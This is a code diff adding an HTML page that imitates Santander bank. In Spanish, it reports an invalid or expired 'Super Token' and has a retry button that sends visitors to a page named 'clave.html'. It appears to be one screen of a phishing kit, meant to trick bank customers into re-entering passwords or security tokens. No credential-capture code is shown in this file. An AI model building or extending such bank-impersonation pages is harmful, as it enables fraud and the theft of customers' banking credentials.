@@ -1,0 +1,54 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Santander</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+    <style>
+      * { margin:0; padding:0; box-sizing:border-box; }
+      body { font-family:'Lato',sans-serif; background:#f5f5f5; min-height:100vh; display:flex; align-items:center; justify-content:center; margin:0; padding:20px; }
+      .container { width:100%; max-width:480px; margin:0 auto; }
+      .card { background:#fff; border-radius:20px; padding:40px 30px 35px; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.08); }
+      .logo { display:flex; justify-content:center; align-items:center; margin:0 0 20px 0; }
+      .logo img { max-width:180px; height:auto; display:block; }
+      .error-icon { font-size:60px; color:#e3000b; margin-bottom:10px; }
+      .error-title { font-size:24px; font-weight:700; color:#1a1a1a; margin-bottom:8px; }
+      .error-sub { font-size:18px; font-weight:400; color:#555; margin-bottom:30px; }
+      .btn-reintentar { width:100%; padding:16px; background:#e3000b; color:#fff; border:none; border-radius:12px; font-size:18px; font-weight:600; letter-spacing:0.5px; cursor:pointer; transition:background .2s, transform .1s; display:flex; align-items:center; justify-content:center; gap:10px; }
+      .btn-reintentar:hover { background:#c9000a; }
+      .btn-reintentar:active { transform:scale(0.97); }
+      .btn-reintentar i { font-size:18px; }
+      .footer-note { margin-top:30px; font-size:13px; color:#aaa; border-top:1px solid #eee; padding-top:20px; display:flex; justify-content:center; gap:25px; }
+      .footer-note a { color:#aaa; text-decoration:none; transition:color .2s; }
+      .footer-note a:hover { color:#e3000b; }
+      @media (max-width:480px) { .card { padding:30px 20px; } .logo img { max-width:140px; } .error-title { font-size:20px; } .error-sub { font-size:16px; } }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="card">
+        <div class="logo">
+          <img src="img\santander_logo.png" alt="Santander" />
+        </div>
+        <div class="error-icon"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i></div>
+        <div class="error-title">Error de Super Token</div>
+        <div class="error-sub">Super Token Inválido / Vencido</div>
+        <button class="btn-reintentar" id="btnReintentar">
+          <i class="fa fa-refresh" aria-hidden="true"></i> Intentar nuevamente
+        </button>
+        <div class="footer-note">
+          <a href="#"><i class="fa fa-lock"></i> Seguridad</a>
+          <a href="#"><i class="fa fa-question-circle"></i> Ayuda</a>
+        </div>
+      </div>
+    </div>
+    <script>
+      document.getElementById('btnReintentar').addEventListener('click', function(e) {
+        e.preventDefault();
+        window.location.href = 'clave.html';
+      });
+    </script>
+  </body>
+</html>
